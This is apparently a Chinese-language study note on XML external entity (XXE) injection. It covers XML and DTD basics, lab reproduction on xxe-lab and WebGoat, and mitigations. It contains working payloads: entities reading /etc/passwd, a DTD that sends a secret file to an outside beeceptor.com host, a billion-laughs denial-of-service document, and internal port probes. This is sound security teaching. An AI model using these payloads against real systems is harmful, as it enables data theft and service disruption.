---
学习目标: XXE

typora-copy-images-to: media
typora-root-url: ./media

---

# 1. 基础理论

## 1.1. XML

Extensible Markup Language，简称：XML。是一种标记语言。标记指计算机所能理解的信息符号，通过此种标记，计算机之间可以处理包含各种信息的文章等。如何定义这些标记，既可以选择国际通用的标记语言，比如HTML，也可以使用像XML这样由相关人士自由决定的标记语言，这就是语言的可扩展性。XML是从标准通用标记语言（SGML）中简化修改出来的。它主要用到的有可扩展标记语言、可扩展样式语言（XSL）、XBRL和XPath等。

## 1.2. XML的发展历史

1. IBM从<font color="red">1960</font>年代就开始发展GML，GML的重要概念：文件中能够明确的将标示与内容分开；所有文件的标示使用方法均一致。
2. <font color="red">1978</font>年，ANSI(美国国家标准学会)将GML加以整理规范，发布成为SGML。
3. <font color="red">1986</font>年起为ISO(国际标准化组织)所采用(ISO 8879)。
4. SGML弱点：非常严谨的文件描述法，过于庞大复杂（标准手册就有500多页），难以理解和学习，进而影响其推广与应用。
5. W3C(万维网联盟)发现HTML问题：不能解决所有解释资料的问题 - 像是影音档或化学公式、音乐符号等其他形态的内容；性能问题 - 需要下载整份文件，才能开始对文件做搜索；扩展性、弹性、易读性均不佳。(<font color="red">H5当然已经不一样了</font>)
6. XML是从<font color="red">1995</font>年开始有其雏形，并向W3C（万维网联盟）提案，而在<font color="red">1998</font>年二月发布为W3C的标准（XML1.0）。

## 1.3. XML与HTML的区别

XML设计用来传送及携带数据信息，不用来表现或展示数据；HTML则用来表现数据，所以XML用途的焦点是它说明数据是什么，以及携带数据信息。

```shell
富文档（Rich Documents）- 自定文件描述并使其更丰富
```

+ 属于文件为主的XML技术应用

+ 标记是用来定义一份资料应该如何呈现

~~~shell
元数据（Metadata）- 描述其它文件或网络资讯
~~~

+ 属于资料为主的XML技术应用

+ 标记是用来说明一份资料的意义

~~~shell
配置文档（Configuration Files）- 描述软件设置的参数
~~~

## 1.4 XML预定义实体

XML 1.0规范允许的（转义后的最终解码值）合法字符： #x9（水平制表符）、#xA（回车符）、#xD（换行符）、#x20-#xD7FF、#xE000-#xFFFD、#x10000-#x10FFFF。即任何Unicode字符，不包含surrogate blocks, FFFE, FFFF。

XML规范定义了5个"预定义实体"来表示特殊字符. XML也允许在每个文档定义任意数量的其它命名实体.

下表列出了5个XML预定义实体. 通过名字引用这些实体的格式为&name;，例如, \&amp; 将绘制为&.

| 名字 | 字符 | Unicode码位(十进制) | 标准    | 描述   |
| ---- | ---- | ------------------- | ------- | ------ |
| quot | "    | U+0022 (34)         | XML 1.0 | 双引号 |
| amp  | &    | U+0026 (38)         | XML 1.0 | &      |
| apos | '    | U+0027 (39)         | XML 1.0 | 撇号   |
| lt   | <    | U+003C (60)         | XML 1.0 | 小于号 |
| gt   | >    | U+003E (62)         | XML 1.0 | 大于号 |

## 1.5. 常用名词及定义

### 1.5.1 标记/内容/标签

> 标记：
>  <开头，以>结尾；或者以字符& 开头，以;结尾。
>  <![CDATA[与]]>是标记，二者之间的文本为内容。 
> 最外界的空白符是标记。
>
> 不是标记的字符就是内容。
>
> 标签（Tag）
> 一个tag属于标记结构，以<开头，以>结尾。Tag名字是大小写敏感，不能包括任何字符 !“#$%&‘()*+,/;<=>?@[\]^`{|}~， 也不能有空格符， 不能以"-"或"."或数字开始。可分为三类：
> start-tag，如<section>;
> end-tag，如</section>;
> empty-element tag，如<line-break />.

### 1.5.2 元素/属性/XML声明

> 元素（Element）
> 元素是文档逻辑组成，或者在start-tag与匹配的end-tag之间，或者仅作为一个empty-element tag。例如：<greeting>Hello, world!</greeting>. 另一个例子是： <line-break />.
> 单个根（root）元素包含所有的其他元素。
>
> 属性（Attribute）
> 属性是一种标记结构，在start-tag或empty-element tag内部的“名字-值对”。例如：`<img src="madonna.jpg" alt="Madonna" />`。每个元素中，一个属性最多出现一次，一个属性只能有一个值。
> 如果属性有多个值，这需要采取XML协议以外的方式来表示，如采用逗号或分号间隔，对于CSS类或标识符的名字可用空格来分隔。
>
> XML声明（declaration）
> XML文档如果以XML declaration开始，则表述了文档的一些信息。如：
> <?xml version="1.0" encoding="UTF-8”?>。

### 1.5.3 PCDATA和CDATA

> PCDATA:
>
> PCDATA的意思是被解析的字符数据。PCDATA是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。文本中的标签会被当作标记来处理，而实体会被展开。
>  被解析的字符数据不应当包含任何&，<，或者>字符，需要用&amp; &lt; &gt;实体来分别替换。

> CDATA:
>
> CDATA意思是字符数据，CDATA 是不会被解析器解析的文本，在这些文本中的标签不会被当作标记来对待，其中的实体也不会被展开。



### 1.5.4  DTD和实体

> DTD:
>
> XML文档有自己的一个格式规范，这个格式规范是由一个叫做 DTD（document type definition） 的东西控制的。DTD用来为XML文档定义语义约束。可以嵌入在XML文档中(内部声明)，也可以独立的放在另外一个单独的文件中(外部引用)。是XML文档中的几条语句，用来说明哪些元素/属性是合法的以及元素间应当怎样嵌套/结合，也用来将一些特殊字符和可复用代码段自定义为实体。
>
> > 内部声明DTD
>
> `<!DOCTYPE 根元素名称 [元素声明]>`
>
> ~~~xml
> <?xml version="1.0" encoding="utf-8"?> 
> <!DOCTYPE movies[ 
> <!ELEMENT movies (movie+)> 
> <!ELEMENT movie (title,actor+,rating*)> 
> <!ELEMENT title (#PCDATA)> 
> <!ELEMENT actor (#PCDATA)> 
> <!ELEMENT rating (#PCDATA)> ]> 
> <movies> 
> 	<movie> 
> 		<title>战狼</title> 
> 		<actor>吴京</actor> 
> 		<actor>余男</actor> 
> 		<actor>斯科特-阿特金斯</actor> 
> 		<rating>家长陪同</rating> 
> 	</movie> 
> 	<movie> 
> 		<title>大话西游</title> 
> 		<actor>周星驰</actor> 
> 		<actor>朱茵</actor> 
> 	</movie> 
> </movies>
> <!-- 电影movie和actor后跟+表示xml文件中movie元素大于等于一个存在，rating后跟*表示元素大于等于0个存在，其中#PCDATA表示该元素可解析。-->
> ~~~
>
> > 引用外部DTD`
>
> `<根元素 SYSTEM “文件名”>：<!DOCTYPE 根元素名称 SYSTEM "dtd路径">
> <根元素 PUBLIC “public_ID” “文件名”>：<!DOCTYPE 根元素 PUBLIC "DTD名称" "DTD文档的URL">`
>
> ~~~xml
> # xml文件
> <?xml version="1.0" encoding="utf-8"?>
> <!DOCTYPE movies SYSTEM "demo.dtd">
> <movies>
> 	<movie>
> 		<title>战狼</title>
> 		<actor>吴京</actor>
> 		<actor>余男</actor>
> 		<actor>斯科特-阿特金斯</actor>
> 		<rating>家长陪同</rating>
> 	</movie>
> 	<movie>
> 		<title>大话西游</title>
> 		<actor>周星驰</actor>
> 		<actor>朱茵</actor>
> 	</movie>
> </movies>
> 
> # demo.dtd
> <?xml version="1.0" encoding="utf-8"?>
> <!ELEMENT movies (movie+)>
> <!ELEMENT movie (title,actor+,rating*)>
> <!ELEMENT title (#PCDATA)>
> <!ELEMENT actor (#PCDATA)>
> <!ELEMENT rating (#PCDATA)>
> ~~~



> DTD实体
> 实体是用于定义引用普通文本或特殊字符的快捷方式的变量。实体引用是对实体的引用。实体可在内部或外部进行声明。
>
> 按实体有无参分类，实体分为一般实体和参数实体
> 一般实体的声明：`<!ENTITY 实体名称 “实体内容">`，引用一般实体的方法：`&实体名称;`
> 普通实体可以在DTD中引用，可以在XML中引用，可以在声明前引用，还可以在实体声明内部引用。
>
> 参数实体的声明：`<!ENTITY % 实体名称 "实体内容">`,引用参数实体的方法：`%实体名称;`
> 经实验，参数实体只能在DTD中引用，不能在声明前引用，也不能在实体声明内部引用。DTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用。
>
> 按实体使用方式分类，实体分为内部声明实体和引用外部实体
> 内部实体:`<!ENTITY 实体名称 "实体的值">`
>
> ~~~xml
> <?xml version = "1.0" encoding = "utf-8"?>
> <!DOCTYPE test [ 
> <!ENTITY writer "Dawn">
> <!ENTITY copyright "Copyright W3School.com.cn"> ]>
> <test>&writer;©right;</test>
> ~~~
>
> 外部实体外部实体，用来引入外部资源。有SYSTEM和PUBLIC两个关键字，表示实体来自本地计算机还是公共计算机。
> `<!ENTITY 实体名称 SYSTEM "URI/URL">` 或者 `<!ENTITY 实体名称 PUBLIC "public_ID" "URI">`
>
> ~~~xml
> <?xml version = "1.0" encoding = "utf-8"?>
> <!DOCTYPE test [ 
> <!ENTITY file SYSTEM "file:///etc/passwd">
> <!ENTITY copyright SYSTEM "http://www.w3school.com.cn/dtd/entities.dtd"> ]>
> <author>&file;©right;</author>
> ~~~



> 例子：
>
> ~~~xml
> <?xml version="1.0"?>
> <!DOCTYPE XXE [
> <!ENTITY % passwd SYSTEM "secret.txt">
> <!ENTITY % wapper "
> <!ENTITY send SYSTEM 'http://attacker.com/?%passwd;'"> 
> %wapper;
> ]>
> <items>&wapper;</items>
> ~~~
>
> `以上语法是不符合XML语法规范的原因如下：`
> ``在DTD内部子集中的参数实体调用不能混掺到标记语言中，``
> `但可以在同级别中被当做标记语言调用`
> `外部参数实体不受此限制`
![image](https://github.com/eagleatman/Injection/blob/master/%E6%B3%A8%E5%85%A5/XXE/media/image-20211010212008863.png)
<img src="../media/image-20211010212008863.png" alt="image-20211010212008863" style="zoom:50%;" align="left"/>

<img src="/image-20211010212026824.png" alt="image-20211010212026824" style="zoom:50%;" align="left"/>

### 1.5.5 不同程序对外部实体的支持

> 不同程序支持的协议

<img src="/image-20211010194614488.png" alt="image-20211010194614488" style="zoom:40%;" align="left"/>

> PHP不同协议所需要的插件

<img src="/image-20211010194647980.png" alt="image-20211010194647980" style="zoom:50%;" align="left"/>

### 1.5.6 XML基本格式与基本语法

> 基本语法：
>
> 1. 所有XML元素都须有关闭标签。
> 2. XML 标签对大小写敏感。
> 3. XML 必须正确地嵌套。
> 4. XML 文档必须有根元素。
> 5. XML 的属性值须加引号。
> 6. 若多个字符都需要转义，则可以将这些内容存放到CDATA里面，<![CDATA[ 内容 ]]>

~~~xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>		<!-- XML文档声明 -->
<bookstore>																			 <!-- 根标签 -->
	<book category="COOKING">											  <!-- book标签 及其属性category -->
		<title>Everyday Italian</title>
		<author>Giada De Laurentiis</author>
		<year>2005</year>
		<price>30.00</price>
	</book>
</bookstore> 			
~~~

<img src="/image-20211010192648974.png" alt="image-20211010192648974" style="zoom: 40%;" align="left"/>



# 2. 漏洞复现

## 2.1 PHP

实验环境采用xxe-lab

https://github.com/c0ny1/xxe-lab

### 2.1.1 Brupsuite 自带工具burp collaborator client测试 

<img src="/image-20211010212324675.png" alt="image-20211010212324675" style="zoom:40%;" align="left"/>

<img src="/image-20211010212546895.png" alt="image-20211010212546895" style="zoom:40%;" align="left"/>

### 2.1.2 使用free.beeceptor.com进一步测试

<img src="/image-20211010212419734.png" alt="image-20211010212419734" style="zoom:40%;" align="left"/>

<img src="/image-20211010212809168.png" alt="image-20211010212809168" style="zoom:40%;" align="left"/>

### 2.1.3 读取带有特殊字符文件的方法，base64编码

<img src="/image-20211010212923669.png" alt="image-20211010212923669" style="zoom:40%;" align="left"/>

### 2.1.4 无回显数据外带

<img src="/image-20211010213233271.png" alt="image-20211010213233271" style="zoom:40%;" align="left"/>

<img src="/image-20211010213313178.png" alt="image-20211010213313178" style="zoom:40%;" align="left"/>

<img src="/image-20211010213351552.png" alt="image-20211010213351552" style="zoom:40%;" align="left"/>

## 2.2 JAVA

java环境采用webgoat，推荐docker安装

https://github.com/WebGoat/WebGoat

docker搭建：https://hub.docker.com/r/webgoat/goatandwolf

### 2.2.1 低难度

<img src="/image-20211010220901163.png" alt="image-20211010220901163" style="zoom:40%;" align="left"/>

<img src="/image-20211010221053957.png" alt="image-20211010221053957" style="zoom:40%;" align="left"/>



### 2.2.2 中难度

<img src="/image-20211010221454544.png" alt="image-20211010221454544" style="zoom:40%;" align="left"/>

<img src="/image-20211010221732259.png" alt="image-20211010221732259" style="zoom:40%;" align="left"/>



<img src="/image-20211010221841386.png" alt="image-20211010221841386" style="zoom:40%;" align="left"/>

<img src="/image-20211010222121094.png" alt="image-20211010222121094" style="zoom:40%;" align="left"/>

<img src="/image-20211010222219900-3875741.png" alt="image-20211010222219900" style="zoom:40%;" align="left"/>

### 2.2.3 高难度





<img src="/image-20211010214630900.png" alt="image-20211010214630900" style="zoom:40%;" align="left"/>

~~~xml
# attack.dtd
<?xml version="1.0" encoding="utf-8"?>
<!ENTITY % file SYSTEM "file:///home/webgoat/.webgoat-8.2.2//XXE/secret.txt">
<!ENTITY % send "<!ENTITY xxe SYSTEM 'https://e0g18.free.beeceptor.com/?xxe=%file;'>">
%send;
~~~



<img src="/image-20211010214853316.png" alt="image-20211010214853316" style="zoom:40%;" align="left"/>

<img src="/image-20211010214953483.png" alt="image-20211010214953483" style="zoom:40%;" align="left"/>

<img src="/image-20211010215206038.png" alt="image-20211010215206038" style="zoom:40%;" align="left"/>



<img src="/image-20211010215507354.png" alt="image-20211010215507354" style="zoom:40%;" align="left"/>

# 3. 高级用法

## 3.1 拒绝服务攻击

~~~xml
<?xml version="1.0"?> <!DOCTYPE lolz [ <!ENTITY lol "lol"> 
<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"> 
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;"> 
<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;"> 
<!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;"> 
<!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;"> 
<!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;"> 
<!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;"> 
<!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;"> ]> 
<lolz>&lol9;</lolz>
~~~

## 3.2 探测内网端口

~~~xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE xxe [ 
<!ELEMENT name ANY >
<!ENTITY xxe SYSTEM "http://127.0.0.1:80" >]>
<root>
	<name>&xxe;</name>
</root>
~~~

## 3.3 攻击内网网站

~~~xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [ 
<!ELEMENT name ANY >
<!ENTITY xxe SYSTEM "http://127.0.0.1:80/payload" >]>
<root>
	<name>&xxe;</name>
</root>
~~~

# 4. 修复建议

1. 使用开发语言提供的禁用外部实体的方法

   ~~~shell
   PHP：
   libxml_disable_entity_loader(true);
   JAVA:
   DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance(); dbf.setExpandEntityReferences(false);
   Python：
   from lxml import etree xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))
   ~~~

2. 过滤用户提交的XML数据

   ~~~shell
   如：<!DOCTYPE和<!ENTITY，SYSTEM和PUBLIC
   ~~~

3. 不允许XML中含有自己定义的DTD

#  5. 遗留问题

> > 1. 远程命令执行，我在三种环境下，都没有复现成功。
> > 2. 利用Base64进行数据回带的过程中，会存在数据不全和乱码问题。

